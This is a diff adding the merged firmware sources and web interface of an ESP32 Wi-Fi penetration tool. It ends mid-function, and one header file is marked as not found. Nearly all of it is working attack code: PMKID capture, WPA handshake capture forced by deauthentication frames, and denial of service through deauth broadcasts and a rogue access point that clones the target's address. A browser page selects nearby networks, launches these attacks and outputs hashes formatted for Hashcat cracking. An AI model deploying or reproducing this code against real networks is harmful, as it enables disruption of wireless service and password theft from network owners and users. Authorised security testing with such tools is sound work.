@@ -1,0 +1,1530 @@
+=== MERGED & CLEANED SOURCES ===
+
+=== FILE: main/attack.c ===
+#include "attack.h"
+#include <stdlib.h>
+#include <string.h>
+#include <unistd.h>
+#define LOG_LOCAL_LEVEL ESP_LOG_VERBOSE
+#include "esp_log.h"
+#include "esp_err.h"
+#include "esp_event.h"
+#include "esp_timer.h"
+#include "attack_pmkid.h"
+#include "attack_handshake.h"
+#include "attack_dos.h"
+#include "webserver.h"
+#include "wifi_controller.h"
+static const char* TAG = "attack";
+static attack_status_t attack_status = { .state = READY, .type = -1, .content_size = 0, .content = NULL };
+static esp_timer_handle_t attack_timeout_handle;
+const attack_status_t *attack_get_status() {
+return &attack_status;
+}
+void attack_update_status(attack_state_t state) {
+attack_status.state = state;
+if(state == FINISHED) {
+ESP_LOGD(TAG, "Stopping attack timeout timer");
+ESP_ERROR_CHECK(esp_timer_stop(attack_timeout_handle));
+}
+}
+void attack_append_status_content(uint8_t *buffer, unsigned size){
+if(size == 0){
+ESP_LOGE(TAG, "Size can't be 0 if you want to reallocate");
+return;
+}
+char *reallocated_content = realloc(attack_status.content, attack_status.content_size + size);
+if(reallocated_content == NULL){
+ESP_LOGE(TAG, "Error reallocating status content! Status content may not be complete.");
+return;
+}
+memcpy(&reallocated_content[attack_status.content_size], buffer, size);
+attack_status.content = reallocated_content;
+attack_status.content_size += size;
+}
+char *attack_alloc_result_content(unsigned size) {
+attack_status.content_size = size;
+attack_status.content = (char *) malloc(size);
+return attack_status.content;
+}
+static void attack_timeout(void* arg){
+ESP_LOGD(TAG, "Attack timed out");
+attack_update_status(TIMEOUT);
+switch(attack_status.type) {
+case ATTACK_TYPE_PMKID:
+ESP_LOGI(TAG, "Aborting PMKID attack...");
+attack_pmkid_stop();
+break;
+case ATTACK_TYPE_HANDSHAKE:
+ESP_LOGI(TAG, "Abort HANDSHAKE attack...");
+attack_handshake_stop();
+break;
+case ATTACK_TYPE_PASSIVE:
+ESP_LOGI(TAG, "Abort PASSIVE attack...");
+break;
+case ATTACK_TYPE_DOS:
+ESP_LOGI(TAG, "Abort DOS attack...");
+attack_dos_stop();
+break;
+default:
+ESP_LOGE(TAG, "Unknown attack type. Not aborting anything");
+}
+}
+static void attack_request_handler(void *args, esp_event_base_t event_base, int32_t event_id, void *event_data) {
+ESP_LOGI(TAG, "Starting attack...");
+attack_request_t *attack_request = (attack_request_t *) event_data;
+attack_config_t attack_config = { .type = attack_request->type, .method = attack_request->method, .timeout = attack_request->timeout };
+attack_config.ap_record = wifictl_get_ap_record(attack_request->ap_record_id);
+attack_status.state = RUNNING;
+attack_status.type = attack_config.type;
+if(attack_config.ap_record == NULL){
+ESP_LOGE(TAG, "NPE: No attack_config.ap_record!");
+return;
+}
+ESP_ERROR_CHECK(esp_timer_start_once(attack_timeout_handle, attack_config.timeout * 1000000));
+switch(attack_config.type) {
+case ATTACK_TYPE_PMKID:
+attack_pmkid_start(&attack_config);
+break;
+case ATTACK_TYPE_HANDSHAKE:
+attack_handshake_start(&attack_config);
+break;
+case ATTACK_TYPE_PASSIVE:
+ESP_LOGW(TAG, "ATTACK_TYPE_PASSIVE not implemented yet!");
+break;
+case ATTACK_TYPE_DOS:
+attack_dos_start(&attack_config);
+break;
+default:
+ESP_LOGE(TAG, "Unknown attack type!");
+}
+}
+static void attack_reset_handler(void *args, esp_event_base_t event_base, int32_t event_id, void *event_data) {
+ESP_LOGD(TAG, "Resetting attack status...");
+if(attack_status.content){
+free(attack_status.content);
+attack_status.content = NULL;
+}
+attack_status.content_size = 0;
+attack_status.type = -1;
+attack_status.state = READY;
+}
+void attack_init(){
+const esp_timer_create_args_t attack_timeout_args = {
+.callback = &attack_timeout
+};
+ESP_ERROR_CHECK(esp_timer_create(&attack_timeout_args, &attack_timeout_handle));
+ESP_ERROR_CHECK(esp_event_handler_register(WEBSERVER_EVENTS, WEBSERVER_EVENT_ATTACK_REQUEST, &attack_request_handler, NULL));
+ESP_ERROR_CHECK(esp_event_handler_register(WEBSERVER_EVENTS, WEBSERVER_EVENT_ATTACK_RESET, &attack_reset_handler, NULL));
+}
+=== FILE: main/attack.h ===
+#ifndef ATTACK_H
+#define ATTACK_H
+#include "esp_wifi_types.h"
+typedef enum {
+ATTACK_TYPE_PASSIVE,
+ATTACK_TYPE_HANDSHAKE,
+ATTACK_TYPE_PMKID,
+ATTACK_TYPE_DOS
+} attack_type_t;
+typedef enum {
+READY,
+RUNNING,
+FINISHED,
+TIMEOUT
+} attack_state_t;
+typedef struct {
+uint8_t type;
+uint8_t method;
+uint8_t timeout;
+const wifi_ap_record_t *ap_record;
+} attack_config_t;
+typedef struct {
+uint8_t state;
+uint8_t type;
+uint16_t content_size;
+char *content;
+} attack_status_t;
+const attack_status_t *attack_get_status();
+void attack_update_status(attack_state_t state);
+void attack_init();
+char *attack_alloc_result_content(unsigned size);
+void attack_append_status_content(uint8_t *buffer, unsigned size);
+#endif
+=== FILE: main/attack_dos.c ===
+#include "attack_dos.h"
+#define LOG_LOCAL_LEVEL ESP_LOG_VERBOSE
+#include "esp_log.h"
+#include "esp_err.h"
+#include "attack.h"
+#include "attack_method.h"
+#include "wifi_controller.h"
+static const char *TAG = "main:attack_dos";
+static attack_dos_methods_t method = -1;
+void attack_dos_start(attack_config_t *attack_config) {
+ESP_LOGI(TAG, "Starting DoS attack...");
+method = attack_config->method;
+switch(method){
+case ATTACK_DOS_METHOD_BROADCAST:
+ESP_LOGD(TAG, "ATTACK_DOS_METHOD_BROADCAST");
+attack_method_broadcast(attack_config->ap_record, 1);
+break;
+case ATTACK_DOS_METHOD_ROGUE_AP:
+ESP_LOGD(TAG, "ATTACK_DOS_METHOD_ROGUE_AP");
+attack_method_rogueap(attack_config->ap_record);
+break;
+case ATTACK_DOS_METHOD_COMBINE_ALL:
+ESP_LOGD(TAG, "ATTACK_DOS_METHOD_ROGUE_AP");
+attack_method_rogueap(attack_config->ap_record);
+attack_method_broadcast(attack_config->ap_record, 1);
+break;
+default:
+ESP_LOGE(TAG, "Method unknown! DoS attack not started.");
+}
+}
+void attack_dos_stop() {
+switch(method){
+case ATTACK_DOS_METHOD_BROADCAST:
+attack_method_broadcast_stop();
+break;
+case ATTACK_DOS_METHOD_ROGUE_AP:
+wifictl_mgmt_ap_start();
+wifictl_restore_ap_mac();
+break;
+case ATTACK_DOS_METHOD_COMBINE_ALL:
+attack_method_broadcast_stop();
+wifictl_mgmt_ap_start();
+wifictl_restore_ap_mac();
+break;
+default:
+ESP_LOGE(TAG, "Unknown attack method! Attack may not be stopped properly.");
+}
+ESP_LOGI(TAG, "DoS attack stopped");
+}
+=== FILE: main/attack_dos.h ===
+#ifndef ATTACK_DOS_H
+#define ATTACK_DOS_H
+#include "attack.h"
+typedef enum{
+ATTACK_DOS_METHOD_ROGUE_AP,
+ATTACK_DOS_METHOD_BROADCAST,
+ATTACK_DOS_METHOD_COMBINE_ALL
+} attack_dos_methods_t;
+void attack_dos_start(attack_config_t *attack_config);
+void attack_dos_stop();
+#endif
+=== FILE: main/attack_handshake.c ===
+#include "attack_handshake.h"
+#include <string.h>
+#define LOG_LOCAL_LEVEL ESP_LOG_VERBOSE
+#include "esp_log.h"
+#include "esp_err.h"
+#include "esp_event.h"
+#include "esp_wifi_types.h"
+#include "attack.h"
+#include "attack_method.h"
+#include "wifi_controller.h"
+#include "frame_analyzer.h"
+#include "pcap_serializer.h"
+#include "hccapx_serializer.h"
+static const char *TAG = "main:attack_handshake";
+static attack_handshake_methods_t method = -1;
+static const wifi_ap_record_t *ap_record = NULL;
+static void eapolkey_frame_handler(void *args, esp_event_base_t event_base, int32_t event_id, void *event_data) {
+ESP_LOGI(TAG, "Got EAPoL-Key frame");
+ESP_LOGD(TAG, "Processing handshake frame...");
+wifi_promiscuous_pkt_t *frame = (wifi_promiscuous_pkt_t *) event_data;
+attack_append_status_content(frame->payload, frame->rx_ctrl.sig_len);
+pcap_serializer_append_frame(frame->payload, frame->rx_ctrl.sig_len, frame->rx_ctrl.timestamp);
+hccapx_serializer_add_frame((data_frame_t *) frame->payload);
+}
+void attack_handshake_start(attack_config_t *attack_config){
+ESP_LOGI(TAG, "Starting handshake attack...");
+method = attack_config->method;
+ap_record = attack_config->ap_record;
+pcap_serializer_init();
+hccapx_serializer_init(ap_record->ssid, strlen((char *)ap_record->ssid));
+wifictl_sniffer_filter_frame_types(true, false, false);
+wifictl_sniffer_start(ap_record->primary);
+frame_analyzer_capture_start(SEARCH_HANDSHAKE, ap_record->bssid);
+ESP_ERROR_CHECK(esp_event_handler_register(FRAME_ANALYZER_EVENTS, DATA_FRAME_EVENT_EAPOLKEY_FRAME, &eapolkey_frame_handler, NULL));
+switch(attack_config->method){
+case ATTACK_HANDSHAKE_METHOD_BROADCAST:
+ESP_LOGD(TAG, "ATTACK_HANDSHAKE_METHOD_BROADCAST");
+attack_method_broadcast(ap_record, 5);
+break;
+case ATTACK_HANDSHAKE_METHOD_ROGUE_AP:
+ESP_LOGD(TAG, "ATTACK_HANDSHAKE_METHOD_ROGUE_AP");
+attack_method_rogueap(ap_record);
+break;
+case ATTACK_HANDSHAKE_METHOD_PASSIVE:
+ESP_LOGD(TAG, "ATTACK_HANDSHAKE_METHOD_PASSIVE");
+break;
+default:
+ESP_LOGD(TAG, "Method unknown! Fallback to ATTACK_HANDSHAKE_METHOD_PASSIVE");
+}
+}
+void attack_handshake_stop(){
+switch(method){
+case ATTACK_HANDSHAKE_METHOD_BROADCAST:
+attack_method_broadcast_stop();
+break;
+case ATTACK_HANDSHAKE_METHOD_ROGUE_AP:
+wifictl_mgmt_ap_start();
+wifictl_restore_ap_mac();
+break;
+case ATTACK_HANDSHAKE_METHOD_PASSIVE:
+break;
+default:
+ESP_LOGE(TAG, "Unknown attack method! Attack may not be stopped properly.");
+}
+wifictl_sniffer_stop();
+frame_analyzer_capture_stop();
+ESP_ERROR_CHECK(esp_event_handler_unregister(ESP_EVENT_ANY_BASE, ESP_EVENT_ANY_ID, &eapolkey_frame_handler));
+ap_record = NULL;
+method = -1;
+ESP_LOGD(TAG, "Handshake attack stopped");
+}
+=== FILE: main/attack_handshake.h ===
+#ifndef ATTACK_HANDSHAKE_H
+#define ATTACK_HANDSHAKE_H
+#include "attack.h"
+typedef enum{
+ATTACK_HANDSHAKE_METHOD_ROGUE_AP,
+ATTACK_HANDSHAKE_METHOD_BROADCAST,
+ATTACK_HANDSHAKE_METHOD_PASSIVE,
+} attack_handshake_methods_t;
+void attack_handshake_start(attack_config_t *attack_config);
+void attack_handshake_stop();
+#endif
+=== FILE: main/attack_method.c ===
+#include "attack_method.h"
+#include <string.h>
+#define LOG_LOCAL_LEVEL ESP_LOG_VERBOSE
+#include "esp_log.h"
+#include "esp_err.h"
+#include "esp_timer.h"
+#include "esp_wifi_types.h"
+#include "wifi_controller.h"
+#include "wsl_bypasser.h"
+static const char *TAG = "main:attack_method";
+static esp_timer_handle_t deauth_timer_handle;
+static void timer_send_deauth_frame(void *arg){
+wsl_bypasser_send_deauth_frame((wifi_ap_record_t *) arg);
+}
+void attack_method_broadcast(const wifi_ap_record_t *ap_record, unsigned period_sec){
+const esp_timer_create_args_t deauth_timer_args = {
+.callback = &timer_send_deauth_frame,
+.arg = (void *) ap_record
+};
+ESP_ERROR_CHECK(esp_timer_create(&deauth_timer_args, &deauth_timer_handle));
+ESP_ERROR_CHECK(esp_timer_start_periodic(deauth_timer_handle, period_sec * 1000000));
+}
+void attack_method_broadcast_stop(){
+ESP_ERROR_CHECK(esp_timer_stop(deauth_timer_handle));
+esp_timer_delete(deauth_timer_handle);
+}
+void attack_method_rogueap(const wifi_ap_record_t *ap_record){
+ESP_LOGD(TAG, "Configuring Rogue AP");
+wifictl_set_ap_mac(ap_record->bssid);
+wifi_config_t ap_config = {
+.ap = {
+.ssid_len = strlen((char *)ap_record->ssid),
+.channel = ap_record->primary,
+.authmode = ap_record->authmode,
+.password = "dummypassword",
+.max_connection = 1
+},
+};
+mempcpy(ap_config.sta.ssid, ap_record->ssid, 32);
+wifictl_ap_start(&ap_config);
+}
+=== FILE: main/Aattack_method.h ===
+!!! NOT FOUND !!!
+
+=== FILE: main/attack_pmkid.c ===
+#include "attack_pmkid.h"
+#include <string.h>
+#define LOG_LOCAL_LEVEL ESP_LOG_VERBOSE
+#include "esp_log.h"
+#include "esp_err.h"
+#include "esp_event.h"
+#include "attack.h"
+#include "wifi_controller.h"
+#include "frame_analyzer.h"
+#include "frame_analyzer_types.h"
+static const char* TAG = "main:attack_pmkid";
+static const wifi_ap_record_t *ap_record = NULL;
+static void pmkid_exit_condition_handler(void *args, esp_event_base_t event_base, int32_t event_id, void *event_data) {
+ESP_LOGD(TAG, "Got PMKID, stopping attack...");
+attack_update_status(FINISHED);
+attack_pmkid_stop();
+pmkid_item_t *pmkid_item_head = *(pmkid_item_t **) event_data;
+pmkid_item_t *pmkid_item = pmkid_item_head;
+unsigned pmkid_item_count = 1;
+while((pmkid_item = pmkid_item->next) != NULL){
+pmkid_item_count++;
+}
+char *content = attack_alloc_result_content(6 + 6 + 1 + strlen((char *) ap_record->ssid) + (pmkid_item_count * 16));
+wifictl_get_sta_mac((uint8_t *) content);
+content += 6;
+memcpy(content, ap_record->bssid, 6);
+content += 6;
+content[0] = strlen((char *) ap_record->ssid);
+content += 1;
+strcpy(content, (char *) ap_record->ssid);
+content += strlen((char *) ap_record->ssid);
+pmkid_item = pmkid_item_head;
+do {
+pmkid_item_head = pmkid_item;
+memcpy(content, pmkid_item_head, 16);
+content += 16;
+pmkid_item = pmkid_item->next;
+free(pmkid_item_head);
+} while(pmkid_item != NULL);
+ESP_LOGD(TAG, "PMKID attack finished");
+}
+void attack_pmkid_start(attack_config_t *attack_config){
+ESP_LOGI(TAG, "Starting PMKID attack...");
+ap_record = attack_config->ap_record;
+wifictl_sniffer_filter_frame_types(true, false, false);
+wifictl_sniffer_start(ap_record->primary);
+frame_analyzer_capture_start(SEARCH_PMKID, ap_record->bssid);
+wifictl_sta_connect_to_ap(ap_record, "dummypassword");
+ESP_ERROR_CHECK(esp_event_handler_register(FRAME_ANALYZER_EVENTS, DATA_FRAME_EVENT_PMKID, &pmkid_exit_condition_handler, NULL));
+}
+void attack_pmkid_stop(){
+wifictl_sta_disconnect();
+wifictl_sniffer_stop();
+frame_analyzer_capture_stop();
+ESP_ERROR_CHECK(esp_event_handler_unregister(ESP_EVENT_ANY_BASE, ESP_EVENT_ANY_ID, &pmkid_exit_condition_handler));
+ESP_LOGD(TAG, "PMKID attack stopped");
+}
+=== FILE: main/attack_pmkid.h ===
+#ifndef ATTACK_PMKID_H
+#define ATTACK_PMKID_H
+#include "attack.h"
+void attack_pmkid_start(attack_config_t *attack_config);
+void attack_pmkid_stop();
+#endif
+=== FILE: main/CMakeLists.txt ===
+idf_component_register(SRCS "attack_dos.c" "attack_method.c" "main.c" "attack_handshake.c" "attack_pmkid.c" "attack.c"
+INCLUDE_DIRS .)
+# REQUIRES esp_timer
+# PRIV_REQUIRES wifi_controller frame_analyzer webserver pcap_serializer hccapx_serializer wsl_bypasser)
+=== FILE: main/main.c ===
+#include <stdio.h>
+#define LOG_LOCAL_LEVEL ESP_LOG_VERBOSE
+#include "esp_log.h"
+#include "esp_event.h"
+#include "attack.h"
+#include "wifi_controller.h"
+#include "webserver.h"
+static const char* TAG = "main";
+void app_main(void)
+{
+ESP_LOGD(TAG, "app_main started");
+ESP_ERROR_CHECK(esp_event_loop_create_default());
+wifictl_mgmt_ap_start();
+attack_init();
+webserver_run();
+}
+=== FILE: components/webserver/utils/index.html ===
+<!DOCTYPE html>
+<html>
+<head>
+<meta name="viewport" content="width=device-width,initial-scale=1">
+<title>ESP32 Management AP</title>
+<style>
+body {
+width: fit-content;
+}
+table, tr, th {
+border: 1px solid;
+border-collapse: collapse;
+text-align: center;
+}
+th, td {
+padding:10px;
+}
+tr:hover, tr.selected {
+background-color: lightblue;
+cursor:pointer;
+}
+</style>
+</head>
+<body onLoad="getStatus()">
+<h1>ESP32 Wi-Fi Penetration Tool</h1>
+<section id="errors"></section>
+<section id="loading">Loading... Please wait</section>
+<section id="ready" style="display: none;">
+<h2>Attack configuration</h2>
+<form onSubmit="runAttack(); return false;">
+<fieldset>
+<legend>Select target</legend>
+<table id="ap-list"></table>
+<p>
+<button type="button" onClick="refreshAps()">Refresh</button>
+</p>
+</fieldset>
+<fieldset>
+<legend>Attack configuration</legend>
+<p>
+<label for="attack_type">Attack type:</label>
+<select id="attack_type" onChange="updateConfigurableFields(this)" required>
+<option value="0" title="This type is not implemented yet." disabled>ATTACK_TYPE_PASSIVE</option>
+<option value="1">ATTACK_TYPE_HANDSHAKE</option>
+<option value="2" selected>ATTACK_TYPE_PMKID</option>
+<option value="3">ATTACK_TYPE_DOS</option>
+</select>
+</p>
+<p>
+<label for="attack_method">Attack method:</label>
+<select id="attack_method" required disabled>
+<option value="" selected disabled hidden>NOT AVAILABLE</option>
+</select>
+</p>
+<p>
+<label for="attack_timeout">Attack timeout (seconds):</label>
+<input type="number" min="0" max="255" id="attack_timeout" value="" required/>
+</p>
+<p>
+<button>Attack</button>
+</p>
+</fieldset>
+</form>
+</section>
+<section id="running" style="display: none;">
+Time elapsed: <span id="running-progress"></span>
+</section>
+<section id="result" style="display: none;">
+<div id="result-meta">Loading result.. Please wait</div>
+<div id="result-content"></div>
+<button type="button" onClick="resetAttack()">New attack</button>
+</section>
+<script>
+var AttackStateEnum = { READY: 0, RUNNING: 1, FINISHED: 2, TIMEOUT: 3};
+var AttackTypeEnum = { ATTACK_TYPE_PASSIVE: 0, ATTACK_TYPE_HANDSHAKE: 1, ATTACK_TYPE_PMKID: 2, ATTACK_TYPE_DOS: 3};
+var selectedApElement = -1;
+var poll;
+var poll_interval = 1000;
+var running_poll;
+var running_poll_interval = 1000;
+var attack_timeout = 0;
+var time_elapsed = 0;
+var defaultResultContent = document.getElementById("result").innerHTML;
+var defaultAttackMethods = document.getElementById("attack_method").outerHTML;
+function getStatus() {
+var oReq = new XMLHttpRequest();
+oReq.onload = function() {
+var arrayBuffer = oReq.response;
+if(arrayBuffer) {
+var attack_state = parseInt(new Uint8Array(arrayBuffer, 0, 1));
+var attack_type = parseInt(new Uint8Array(arrayBuffer, 1, 1));
+var attack_content_size = parseInt(new Uint16Array(arrayBuffer, 2, 1));
+var attack_content = new Uint8Array(arrayBuffer, 4);
+console.log("attack_state=" + attack_state + "; attack_type=" + attack_type + "; attack_count_size=" + attack_content_size);
+var status = "ERROR: Cannot parse attack state.";
+hideAllSections();
+switch(attack_state) {
+case AttackStateEnum.READY:
+showAttackConfig();
+break;
+case AttackStateEnum.RUNNING:
+showRunning();
+console.log("Poll");
+setTimeout(getStatus, poll_interval);
+break;
+case AttackStateEnum.FINISHED:
+showResult("FINISHED", attack_type, attack_content_size, attack_content);
+break;
+case AttackStateEnum.TIMEOUT:
+showResult("TIMEOUT", attack_type, attack_content_size, attack_content);
+break;
+default:
+document.getElementById("errors").innerHTML = "Error loading attack status! Unknown state.";
+}
+return;
+}
+};
+oReq.onerror = function() {
+console.log("Request error");
+document.getElementById("errors").innerHTML = "Cannot reach ESP32. Check that you are connected to management AP. You might get disconnected during attack.";
+getStatus();
+};
+oReq.ontimeout = function() {
+console.log("Request timeout");
+getStatus();
+};
+oReq.open("GET", "http://192.168.4.1/status", true);
+oReq.responseType = "arraybuffer";
+oReq.send();
+}
+function hideAllSections(){
+for(let section of document.getElementsByTagName("section")){
+section.style.display = "none";
+};
+}
+function showRunning(){
+hideAllSections();
+document.getElementById("running").style.display = "block";
+}
+function countProgress(){
+if(time_elapsed >= attack_timeout){
+document.getElementById("errors").innerHTML = "Please reconnect to management AP";
+document.getElementById("errors").style.display = "block";
+clearInterval(running_poll);
+}
+document.getElementById("running-progress").innerHTML = time_elapsed + "/" + attack_timeout + "s";
+time_elapsed++;
+}
+function showAttackConfig(){
+document.getElementById("ready").style.display = "block";
+refreshAps();
+}
+function showResult(status, attack_type, attack_content_size, attack_content){
+hideAllSections();
+clearInterval(poll);
+document.getElementById("result").innerHTML = defaultResultContent;
+document.getElementById("result").style.display = "block";
+document.getElementById("result-meta").innerHTML = status + "<br>";
+type = "ERROR: Cannot parse attack type.";
+switch(attack_type) {
+case AttackTypeEnum.ATTACK_TYPE_PASSIVE:
+type = "ATTACK_TYPE_PASSIVE";
+break;
+case AttackTypeEnum.ATTACK_TYPE_HANDSHAKE:
+type = "ATTACK_TYPE_HANDSHAKE";
+resultHandshake(attack_content, attack_content_size);
+break;
+case AttackTypeEnum.ATTACK_TYPE_PMKID:
+type = "ATTACK_TYPE_PMKID";
+resultPmkid(attack_content, attack_content_size);
+break;
+case AttackTypeEnum.ATTACK_TYPE_DOS:
+type = "ATTACK_TYPE_DOS";
+break;
+default:
+type = "UNKNOWN";
+}
+document.getElementById("result-meta").innerHTML += type + "<br>";
+}
+function refreshAps() {
+document.getElementById("ap-list").innerHTML = "Loading (this may take a while)...";
+var oReq = new XMLHttpRequest();
+oReq.onload = function() {
+document.getElementById("ap-list").innerHTML = "<th>SSID</th><th>BSSID</th><th>RSSI</th>";
+var arrayBuffer = oReq.response;
+if(arrayBuffer) {
+var byteArray = new Uint8Array(arrayBuffer);
+for  (let i = 0; i < byteArray.byteLength; i = i + 40) {
+var tr = document.createElement('tr');
+tr.setAttribute("id", i / 40);
+tr.setAttribute("onClick", "selectAp(this)");
+var td_ssid = document.createElement('td');
+var td_rssi = document.createElement('td');
+var td_bssid = document.createElement('td');
+td_ssid.innerHTML = new TextDecoder("utf-8").decode(byteArray.subarray(i + 0, i + 32));
+tr.appendChild(td_ssid);
+for(let j = 0; j < 6; j++){
+td_bssid.innerHTML += uint8ToHex(byteArray[i + 33 + j]) + ":";
+}
+tr.appendChild(td_bssid);
+td_rssi.innerHTML = byteArray[i + 39] - 255;
+tr.appendChild(td_rssi);
+document.getElementById("ap-list").appendChild(tr);
+}
+}
+};
+oReq.onerror = function() {
+document.getElementById("ap-list").innerHTML = "ERROR";
+};
+oReq.open("GET", "http://192.168.4.1/ap-list", true);
+oReq.responseType = "arraybuffer";
+oReq.send();
+}
+function selectAp(el) {
+console.log(el.id);
+if(selectedApElement != -1){
+selectedApElement.classList.remove("selected")
+}
+selectedApElement=el;
+el.classList.add("selected");
+}
+function runAttack() {
+if(selectedApElement == -1){
+console.log("No AP selected. Attack not started.");
+document.getElementById("errors").innerHTML = "No AP selected. Attack not started.";
+return;
+}
+hideAllSections();
+document.getElementById("running").style.display = "block";
+var arrayBuffer = new ArrayBuffer(4);
+var uint8Array = new Uint8Array(arrayBuffer);
+uint8Array[0] = parseInt(selectedApElement.id);
+uint8Array[1] = parseInt(document.getElementById("attack_type").value);
+uint8Array[2] = parseInt(document.getElementById("attack_method").value);
+uint8Array[3] = parseInt(document.getElementById("attack_timeout").value);
+var oReq = new XMLHttpRequest();
+oReq.open("POST", "http://192.168.4.1/run-attack", true);
+oReq.send(arrayBuffer);
+getStatus();
+attack_timeout = parseInt(document.getElementById("attack_timeout").value);
+time_elapsed = 0;
+running_poll = setInterval(countProgress, running_poll_interval);
+}
+function resetAttack(){
+hideAllSections();
+showAttackConfig();
+var oReq = new XMLHttpRequest();
+oReq.open("HEAD", "http://192.168.4.1/reset", true);
+oReq.send();
+}
+function resultPmkid(attack_content, attack_content_size){
+var mac_ap = "";
+var mac_sta = "";
+var ssid = "";
+var ssid_text = "";
+var pmkid = "";
+var index = 0;
+for(let i = 0; i < 6; i = i + 1) {
+mac_ap += uint8ToHex(attack_content[index + i]);
+}
+index = index + 6;
+for(let i = 0; i < 6; i = i + 1) {
+mac_sta += uint8ToHex(attack_content[index + i]);
+}
+index = index + 6;
+for(let i = 0; i < attack_content[index]; i = i + 1) {
+ssid += uint8ToHex(attack_content[index + 1 + i]);
+ssid_text += String.fromCharCode(attack_content[index + 1 + i]);
+}
+index = index + attack_content[index] + 1;
+var pmkid_cnt = 0;
+for(let i = 0; i < attack_content_size - index; i = i + 1) {
+if((i % 16) == 0){
+pmkid += "<br>";
+pmkid += "</code>PMKID #" + pmkid_cnt + ": <code>";
+pmkid_cnt += 1;
+}
+pmkid += uint8ToHex(attack_content[index + i]);
+}
+document.getElementById("result-content").innerHTML = "";
+document.getElementById("result-content").innerHTML += "MAC AP: <code>" + mac_ap + "</code><br>";
+document.getElementById("result-content").innerHTML += "MAC STA: <code>" + mac_sta + "</code><br>";
+document.getElementById("result-content").innerHTML += "(E)SSID: <code>" + ssid + "</code> (" + ssid_text + ")";
+document.getElementById("result-content").innerHTML += "<code>" + pmkid + "</code><br>";
+document.getElementById("result-content").innerHTML += "<br>Hashcat ready format:"
+document.getElementById("result-content").innerHTML += "<code>" + pmkid + "*" + mac_ap + "*" + mac_sta  + "*" + ssid  + "</code><br>";
+}
+function resultHandshake(attack_content, attack_content_size){
+document.getElementById("result-content").innerHTML = "";
+var pcap_link = document.createElement("a");
+pcap_link.setAttribute("href", "capture.pcap");
+pcap_link.text = "Download PCAP file";
+var hccapx_link = document.createElement("a");
+hccapx_link.setAttribute("href", "capture.hccapx");
+hccapx_link.text = "Download HCCAPX file";
+document.getElementById("result-content").innerHTML += "<p>" + pcap_link.outerHTML + "</p>";
+document.getElementById("result-content").innerHTML += "<p>" + hccapx_link.outerHTML + "</p>";
+var handshakes = "";
+for(let i = 0; i < attack_content_size; i = i + 1) {
+handshakes += uint8ToHex(attack_content[i]);
+if(i % 50 == 49) {
+handshakes += "\n";
+}
+}
+document.getElementById("result-content").innerHTML += "<pre><code>" + handshakes + "</code></pre>";
+}
+function uint8ToHex(uint8){
+return ("00" + uint8.toString(16)).slice(-2);
+}
+function updateConfigurableFields(el){
+document.getElementById("attack_method").outerHTML = defaultAttackMethods;
+switch(parseInt(el.value)){
+case AttackTypeEnum.ATTACK_TYPE_PASSIVE:
+console.log("PASSIVE configuration");
+break;
+case AttackTypeEnum.ATTACK_TYPE_HANDSHAKE:
+console.log("HANDSHAKE configuration");
+document.getElementById("attack_timeout").value = 60;
+setAttackMethods(["DEAUTH_ROGUE_AP (PASSIVE)", "DEAUTH_BROADCAST (ACTIVE)", "CAPTURE_ONLY (PASSIVE)"]);
+break;
+case AttackTypeEnum.ATTACK_TYPE_PMKID:
+console.log("PMKID configuration");
+document.getElementById("attack_timeout").value = 5;
+break;
+case AttackTypeEnum.ATTACK_TYPE_DOS:
+console.log("DOS configuration");
+document.getElementById("attack_timeout").value = 120;
+setAttackMethods(["DEAUTH_ROGUE_AP (PASSIVE)", "DEAUTH_BROADCAST (ACTIVE)", "DEAUTH_COMBINE_ALL"]);
+break;
+default:
+console.log("Unknown attack type");
+break;
+}
+}
+function setAttackMethods(attackMethodsArray){
+document.getElementById("attack_method").removeAttribute("disabled");
+attackMethodsArray.forEach(function(method, index){
+let option = document.createElement("option");
+option.value = index;
+option.text = method;
+option.selected = true;
+document.getElementById("attack_method").appendChild(option);
+});
+}
+</script>
+</body>
+</html>
+=== FILE: components/webserver/webserver.c ===
+#include "webserver.h"
+#define LOG_LOCAL_LEVEL ESP_LOG_VERBOSE
+#include "esp_log.h"
+#include "esp_err.h"
+#include "esp_event.h"
+#include "esp_http_server.h"
+#include "esp_wifi_types.h"
+#include "wifi_controller.h"
+#include "attack.h"
+#include "pcap_serializer.h"
+#include "hccapx_serializer.h"
+#include "pages/page_index.h"
+static const char* TAG = "webserver";
+ESP_EVENT_DEFINE_BASE(WEBSERVER_EVENTS);
+static esp_err_t uri_root_get_handler(httpd_req_t *req) {
+httpd_resp_set_type(req, "text/html");
+httpd_resp_set_hdr(req, "Content-Encoding", "gzip");
+return httpd_resp_send(req, (const char *)page_index, page_index_len);
+}
+static httpd_uri_t uri_root_get = {
+.uri = "/",
+.method = HTTP_GET,
+.handler = uri_root_get_handler,
+.user_ctx = NULL
+};
+static esp_err_t uri_reset_head_handler(httpd_req_t *req) {
+ESP_ERROR_CHECK(esp_event_post(WEBSERVER_EVENTS, WEBSERVER_EVENT_ATTACK_RESET, NULL, 0, portMAX_DELAY));
+return httpd_resp_send(req, NULL, 0);
+}
+static httpd_uri_t uri_reset_head = {
+.uri = "/reset",
+.method = HTTP_HEAD,
+.handler = uri_reset_head_handler,
+.user_ctx = NULL
+};
+static esp_err_t uri_ap_list_get_handler(httpd_req_t *req) {
+wifictl_scan_nearby_aps();
+const wifictl_ap_records_t *ap_records;
+ap_records = wifictl_get_ap_records();
+char resp_chunk[40];
+ESP_ERROR_CHECK(httpd_resp_set_type(req, HTTPD_TYPE_OCTET));
+for(unsigned i = 0; i < ap_records->count; i++){
+memcpy(resp_chunk, ap_records->records[i].ssid, 33);
+memcpy(&resp_chunk[33], ap_records->records[i].bssid, 6);
+memcpy(&resp_chunk[39], &ap_records->records[i].rssi, 1);
+ESP_ERROR_CHECK(httpd_resp_send_chunk(req, resp_chunk, 40));
+}
+return httpd_resp_send_chunk(req, resp_chunk, 0);
+}
+static httpd_uri_t uri_ap_list_get = {
+.uri = "/ap-list",
+.method = HTTP_GET,
+.handler = uri_ap_list_get_handler,
+.user_ctx = NULL
+};
+static esp_err_t uri_run_attack_post_handler(httpd_req_t *req) {
+attack_request_t attack_request;
+httpd_req_recv(req, (char *)&attack_request, sizeof(attack_request_t));
+esp_err_t res = httpd_resp_send(req, NULL, 0);
+ESP_ERROR_CHECK(esp_event_post(WEBSERVER_EVENTS, WEBSERVER_EVENT_ATTACK_REQUEST, &attack_request, sizeof(attack_request_t), portMAX_DELAY));
+return res;
+}
+static httpd_uri_t uri_run_attack_post = {
+.uri = "/run-attack",
+.method = HTTP_POST,
+.handler = uri_run_attack_post_handler,
+.user_ctx = NULL
+};
+static esp_err_t uri_status_get_handler(httpd_req_t *req) {
